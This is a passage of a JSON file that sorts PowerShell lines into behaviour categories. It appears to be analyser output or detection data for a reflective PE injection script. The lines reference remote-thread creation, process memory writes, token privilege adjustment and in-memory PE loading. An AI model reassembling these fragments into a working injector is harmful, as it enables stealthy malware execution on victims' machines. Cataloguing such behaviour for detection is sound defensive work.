                                "($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null",
                                "($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null",
                                "Write-Output $TypeBuilder.CreateType()"
                            ],
                            "name": "action:DotNet.Type/Define"
                        },
                        {
                            "lines": [
                                "$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]",
                                "$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])",
                                "$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))",
                                "$GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])",
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])",
                                "$NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])",
                                "$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])",
                                "$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])",
                                "$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |",
                                "$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])",
                                "$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])"
                            ],
                            "name": "action:DotNet.Type/Reflect"
                        },
                        {
                            "lines": [
                                "$AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)",
                                "$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)",
                                "$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)",
                                "$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)",
                                "$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)",
                                "$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)",
                                "$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)",
                                "$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])",
                                "$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])",
                                "$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)",
                                "$GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)",
                                "$GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)",
                                "$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')",
                                "$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)",
                                "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))",
                                "$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)",
                                "$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)",
                                "$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)",
                                "$ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)",
                                "$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)",
                                "$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)",
                                "$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)",
                                "$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)",
                                "$LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)",
                                "$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))",
                                "$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)",
                                "$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)",
                                "$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)",
                                "$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])",
                                "$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])",
                                "$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)",
                                "$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)",
                                "$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)",
                                "$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)",
                                "$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)",
                                "$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')",
                                "$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)",
                                "$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)",
                                "$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)",
                                "$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)",
                                "$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)",
                                "$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)",
                                "$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)",
                                "$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)",
                                "$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)",
                                "$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)",
                                "$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)",
                                "$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)",
                                "[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)",
                                "[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])",
                                "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)",
                                "[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])",
                                "[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))",
                                "[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])",
                                "[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)",
                                "[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)",
                                "[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)",
                                "[System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)",
                                "[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)",
                                "[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)",
                                "[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])",
                                "[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])"
                            ],
                            "name": "action:DotNet.UnmanagedCode/Invoke"
                        },
                        {
                            "lines": [
                                "Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants",
                                "Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types",
                                "Test-MemoryRangeValid -DebugString \"Copy-Sections::MarshalCopy\" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null",
                                "Test-MemoryRangeValid -DebugString \"Copy-Sections::Memset\" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null",
                                "Write-Verbose \"Copy PE sections in to memory\"",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null",
                                "[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)"
                            ],
                            "name": "action:Item/Copy"
                        },
                        {
                            "lines": [
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false",
                                "$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle",
                                "$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy",
                                "$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset",
                                "$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle",
                                "$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx",
                                "$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES"
                            ],
                            "name": "action:Member/Add"
                        },
                        {
                            "lines": [
                                "Throw \"Cannot compare byte arrays of different size\"",
                                "elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)",
                                "elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)",
                                "if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)",
                                "if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)"
                            ],
                            "name": "action:Object/Compare"
                        },
                        {
                            "lines": [
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))",
                                "$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')",
                                "$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')",
                                "$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)",
                                "$NtHeadersInfo = New-Object System.Object",
                                "$PEInfo = New-Object System.Object",
                                "$Parameters = (New-Object Type[](0)),",
                                "$Win32Constants = New-Object System.Object",
                                "$Win32Functions = New-Object System.Object",
                                "$Win32Types = New-Object System.Object",
                                "$tmpPtr = New-Object IntPtr",
                                "if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))",
                                "if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {"
                            ],
                            "name": "action:Object/New"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId"
                            ],
                            "name": "action:Object/Select"
                        },
                        {
                            "lines": [
                                "$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId",
                                "$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)",
